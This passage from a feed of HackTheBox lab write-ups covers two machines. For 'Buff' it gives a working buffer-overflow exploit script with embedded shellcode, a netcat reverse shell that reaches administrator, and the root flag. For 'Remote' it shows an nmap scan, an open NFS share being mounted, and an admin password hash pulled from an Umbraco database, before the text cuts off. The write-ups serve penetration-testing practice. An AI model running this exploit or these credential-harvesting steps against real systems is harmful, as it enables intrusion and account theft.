class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># cat buff.py </span></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line">padding1   = b<span class="string">&quot;\x90&quot;</span> * 1052</span><br><span class="line">EIP        = b<span class="string">&quot;\xB5\x42\xA8\x68&quot;</span> <span class="comment"># 0x68A842B5 -&gt; PUSH ESP, RET</span></span><br><span class="line">NOPS       = b<span class="string">&quot;\x90&quot;</span> * 30</span><br><span class="line"></span><br><span class="line"><span class="comment">#msfvenom -a x86 -p windows/exec CMD=calc.exe -b &#x27;\x00\x0A\x0D&#x27; -f python</span></span><br><span class="line">payload =  b<span class="string">&quot;&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xba\xd7\xda\x14\xc1\xdb\xcd\xd9\x74\x24\xf4\x58&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x31\xc9\xb1\x3e\x31\x50\x15\x83\xc0\x04\x03\x50&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x11\xe2\x22\x26\xfc\x43\xcc\xd7\xfd\x23\x45\x32&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xcc\x63\x31\x36\x7f\x54\x32\x1a\x8c\x1f\x16\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x07\x6d\xbe\xa0\xa0\xd8\x98\x8f\x31\x70\xd8\x8e&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xb1\x8b\x0c\x71\x8b\x43\x41\x70\xcc\xbe\xab\x20&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x85\xb5\x19\xd5\xa2\x80\xa1\x5e\xf8\x05\xa1\x83&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x49\x27\x80\x15\xc1\x7e\x02\x97\x06\x0b\x0b\x8f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4b\x36\xc2\x24\xbf\xcc\xd5\xec\xf1\x2d\x79\xd1&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x3d\xdc\x80\x15\xf9\x3f\xf7\x6f\xf9\xc2\x0f\xb4&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x83\x18\x9a\x2f\x23\xea\x3c\x94\xd5\x3f\xda\x5f&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xd9\xf4\xa9\x38\xfe\x0b\x7e\x33\xfa\x80\x81\x94&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x8a\xd3\xa5\x30\xd6\x80\xc4\x61\xb2\x67\xf9\x72&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x1d\xd7\x5f\xf8\xb0\x0c\xd2\xa3\xde\xd3\x61\xde&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\xad\xd4\x79\xe1\x81\xbc\x48\x6a\x4e\xba\x55\xb9&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x2a\x34\x1c\xe0\x1b\xdd\xf8\x70\x1e\x80\xfb\xae&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x5d\xbd\x7f\x5b\x1e\x3a\x9f\x2e\x1b\x06\x18\xc2&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x51\x17\xcc\xe4\xc6\x18\xc5\xa6\xd2\xba\x9d\x49&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x4e\x33\x2d\xd6\xf8\xc7\xa9\x89\x9b\x54\x6d\x31&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x25\xf6\xd1\xc8\xa5\x64\x86\x53\x22\x29\x36\xf7&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x84\xb4\xbe\x92\xf8\x1b\x5b\x7d\x9a\x0e\xc7\x53&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x39\xa9\x62\x8c\xf0\x79\x42\xfd\xc2\x57\xab\xca&quot;</span></span><br><span class="line">payload += b<span class="string">&quot;\x0c\x9a\xfa\x02\x71\xed\xcc\x5d\x49\x11&quot;</span></span><br><span class="line">overrun    = b<span class="string">&quot;C&quot;</span> * (1500 - len(padding1 + NOPS + EIP + payload))</span><br><span class="line"></span><br><span class="line">buf = padding1 + EIP + NOPS + payload + overrun </span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((target,8888))</span><br><span class="line">        s.send(buf)</span><br><span class="line">except Exception as e:</span><br><span class="line">        <span class="built_in">print</span>(sys.exc_value)</span><br><span class="line">root@JIYE:~/htb/buff<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>kaliç›‘å¬ç«¯å£</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 7078</span></span><br><span class="line">listening on [any] 7078 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>æ‰§è¡Œbuff.pyåˆ©ç”¨</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/buff<span class="comment"># python3 buff.py</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 7078</span></span><br><span class="line">listening on [any] 7078 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.10.198] 50209</span><br><span class="line">Microsoft Windows [Version 10.0.17134.1610]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">buff\administrator</span><br></pre></td></tr></table></figure><p><code>ææƒå®Œæˆï¼Œå¯»æ‰¾root.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;<span class="built_in">type</span> root.txt</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br><span class="line">af0c7f7eef091d9e4b4cd0f0e88268c9</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2020/09/01/HTB-buff/image-20200905172118673.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[remote]</title>
    <link href="https://lunamoore.github.io/2020/08/31/HTB-remote/"/>
    <id>https://lunamoore.github.io/2020/08/31/HTB-remote/</id>
    <published>2020-08-31T15:28:33.000Z</published>
    <updated>2020-09-05T09:20:07.912Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2020/08/31/HTB-remote/image-20200905171855936.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>ä¸»è¦ä¿¡æ¯21/80ç«¯å£ï¼ŒnfsæœåŠ¡ä¸mountd</code></p><blockquote><p>NFSï¼ˆNetwork File Systemï¼‰å³ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œæ˜¯FreeBSDæ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ç§ï¼Œå®ƒå…è®¸ç½‘ç»œä¸­çš„è®¡ç®—æœºä¹‹é—´å…±äº«èµ„æºã€‚åœ¨NFSçš„åº”ç”¨ä¸­ï¼Œæœ¬åœ°NFSçš„å®¢æˆ·ç«¯åº”ç”¨å¯ä»¥é€æ˜åœ°è¯»å†™ä½äºè¿œç«¯NFSæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå°±åƒè®¿é—®æœ¬åœ°æ–‡ä»¶ä¸€æ ·ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># nmap -sC -sV 10.10.10.180 -oN nmap.CV</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 06:09 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.180</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">21/tcp   open  ftp           Microsoft ftpd</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Home - Acme Widgets</span><br><span class="line">111/tcp  open  rpcbind       2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/tcp6  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp6  rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/tcp   mountd</span><br><span class="line">|   100005  1,2,3       2049/tcp6  mountd</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">2049/tcp open  mountd        1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 1m52s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-08-31T10:12:50</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 86.17 seconds</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®ftp"><a href="#0x02-è®¿é—®ftp" class="headerlink" title="0x02.è®¿é—®ftp"></a>0x02.è®¿é—®ftp</h2><p><code>æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</code></p><img src="/2020/08/31/HTB-remote/image-20200831190220563.png" class><h2 id="0x03-è®¿é—®80ç«¯å£"><a href="#0x03-è®¿é—®80ç«¯å£" class="headerlink" title="0x03.è®¿é—®80ç«¯å£"></a>0x03.è®¿é—®80ç«¯å£</h2><img src="/2020/08/31/HTB-remote/image-20200831191217565.png" class><p><code>æ‰‹åŠ¨çˆ¬è™«ï¼Œå‘ç°umbracoç™»å…¥æ¡†</code></p><blockquote><p>umbracoä¸ºä»˜è´¹cms</p></blockquote><img src="/2020/08/31/HTB-remote/image-20200831191429524.png" class><h2 id="0x04-æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯"><a href="#0x04-æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯" class="headerlink" title="0x04.æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯"></a>0x04.æŸ¥çœ‹æŒ‚è½½ä¿¡æ¯</h2><p><code>æŸ¥çœ‹æŒ‚è½½ç›®å½•ï¼Œå‘ç°ç½‘ç«™å¤‡ä»½æ–‡ä»¶ï¼Œæƒé™ä¸ºeveryone</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># showmount -e 10.10.10.180</span></span><br><span class="line">Export list <span class="keyword">for</span> 10.10.10.180:</span><br><span class="line">/site_backups (everyone)</span><br><span class="line">root@JIYE:~/htb/remote<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>æŒ‚è½½åˆ°æœ¬åœ°ï¼Œè¿›è¡ŒæŸ¥çœ‹</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote<span class="comment"># mkdir site_backups</span></span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># mount 10.10.10.180:site_backups site_backups/</span></span><br><span class="line">root@JIYE:~/htb/remote<span class="comment"># cd site_backups/</span></span><br><span class="line">root@JIYE:~/htb/remote/site_backups<span class="comment"># ls</span></span><br><span class="line">App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config</span><br><span class="line">App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views</span><br><span class="line">root@JIYE:~/htb/remote/site_backups<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹Umbraco.sdfæ•°æ®åº“ä¸­adminå­—ç¬¦</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/remote/site_backups<span class="comment"># cd App_Data/</span></span><br><span class="line">root@JIYE:~/htb/remote/site_backups/App_Data<span class="comment"># ls</span></span><br><span class="line">cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf  </span><br><span class="line">root@JIYE:~/htb/remote/site_backups/App_Data<span class="comment"># strings Umbraco.sdf | grep admin</span></span><br><span class="line">Administratoradmindefaulten-US</span><br><span class="line">Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d</span><br><span class="line">Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d</span><br><span class="line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50</span><br><span class="line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating SessionTimeout, SecurityStamp, CreateDate, UpdateDate, Id, HasIdentity</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Key, IsApproved, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;smith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Key, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;smith@htb.local&gt;umbraco/user/saveupdating Name, Key, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating Username, Email, Key, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, RawPasswordValue, SecurityStamp, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;ssmith&quot;</span> &lt;ssmith@htb.local&gt;umbraco/user/saveupdating Key, Groups, UpdateDate; groups assigned: writer</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;SYSTEM&quot;</span> 192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/logoutlogout success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1umbraco/user/sign-in/failedlogin failed</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating FailedPasswordAttempts, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastLoginDate, UpdateDate</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/sign-in/loginlogin success</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/saveupdating LastPasswordChangeDate, 